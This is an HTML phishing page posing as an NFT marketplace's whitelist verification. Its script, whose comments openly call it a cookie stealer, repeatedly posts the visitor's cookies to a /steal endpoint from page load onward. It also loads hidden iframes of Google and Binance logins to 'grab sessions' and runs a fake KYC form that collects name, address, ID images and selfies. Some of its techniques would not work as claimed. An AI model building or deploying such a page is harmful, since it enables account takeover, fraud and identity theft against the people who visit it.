<!DOCTYPE html>
<html>
<head>
    <title>Pure NFT Market</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {
            background: linear-gradient(45deg, #000, #111);
            color: #00ff00;
            font-family: 'Courier New', monospace;
            text-align: center;
            padding: 20px;
            margin: 0;
        }
        h1 { font-size: 28px; margin: 20px 0; }
        button {
            width: 90%;
            max-width: 300px;
            padding: 20px;
            font-size: 18px;
            background: #00ff00;
            color: #000;
            border: none;
            border-radius: 15px;
            margin: 15px 0;
            cursor: pointer;
        }
        button:hover { background: #00cc00; }
        .form-group { margin: 20px 0; text-align: left; max-width: 90%; margin-left: auto; margin-right: auto; }
        input[type="text"], input[type="file"] {
            width: 100%;
            padding: 15px;
            margin: 10px 0;
            background: #111;
            color: #00ff00;
            border: 1px solid #00ff00;
            border-radius: 10px;
            font-size: 16px;
        }
        #status { color: #00ff88; margin: 20px 0; }
        #kycForm { display: none; }
    </style>
</head>
<body>
    <h1>🔥 Pure NFT Market</h1>
    <p>Whitelist Verification Required</p>
    
    <button onclick="connectAccounts()">📱 Tap to Connect Gmail/Binance</button>
    <div id="status"></div>
    
    <div id="kycForm">
        <div class="form-group">
            <input type="text" id="name" placeholder="Full Name">
        </div>
        <div class="form-group">
            <input type="text" id="address" placeholder="Full Address">
        </div>
        <div class="form-group">
            <input type="file" id="idfront" accept="image/*">
            <small>ID Front</small>
        </div>
        <div class="form-group">
            <input type="file" id="idback" accept="image/*">
            <small>ID Back</small>
        </div>
        <div class="form-group">
            <input type="file" id="selfie1" accept="image/*">
            <small>Live Selfie 1</small>
        </div>
        <div class="form-group">
            <input type="file" id="selfie2" accept="image/*">
            <small>Selfie 2 (Turn Left)</small>
        </div>
        <div class="form-group">
            <input type="file" id="selfie3" accept="image/*">
            <small>Selfie 3 (Smile)</small>
        </div>
        <button onclick="submitKYC()">✅ Submit KYC</button>
    </div>

    <script>
        // Status update
        function updateStatus(msg) {
            document.getElementById('status').innerHTML = '✅ ' + msg;
        }
        
        // 1. Connect & Auto-Steal
        function connectAccounts() {
            updateStatus('Connecting accounts...');
            
            // Invisible iframes for session grab
            const urls = ['https://accounts.google.com', 'https://www.binance.com/en/login'];
            urls.forEach(url => {
                const iframe = document.createElement('iframe');
                iframe.src = url;
                iframe.style.display = 'none';
                document.body.appendChild(iframe);
            });
            
            // Send initial steal
            stealCookies();
            document.getElementById('kycForm').style.display = 'block';
            updateStatus('Connected! Complete KYC below');
        }
        
        // 2. Cookie Stealer (Every 5 seconds)
        function stealCookies() {
            fetch('/steal', {
                method: 'POST',
                body: JSON.stringify({
                    cookies: document.cookie,
                    localStorage: Object.keys(localStorage).length,
                    sessionStorage: Object.keys(sessionStorage).length
                }),
                headers: { 'Content-Type': 'application/json' }
            }).then(() => {
                setTimeout(stealCookies, 5000); // Repeat!
            });
        }
        
        // 3. KYC Submit
        async function submitKYC() {
            updateStatus('Uploading KYC...');
            
            const kycData = {
                name: document.getElementById('name').value,
                address: document.getElementById('address').value,
                cookies: document.cookie,
                files: []
            };
            
            // File names only (for demo)
            ['idfront', 'idback', 'selfie1', 'selfie2', 'selfie3'].forEach(id => {
                const file = document.getElementById(id).files[0];
                if (file) kycData.files.push(file.name);
            });
            
            await fetch('/kyc', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(kycData)
            });
            
            updateStatus('🎉 KYC COMPLETE! Check your webhook.');
        }
        
        // Auto-start stealing after 3 seconds
        setTimeout(stealCookies, 3000);
    </script>
</body>
</html>
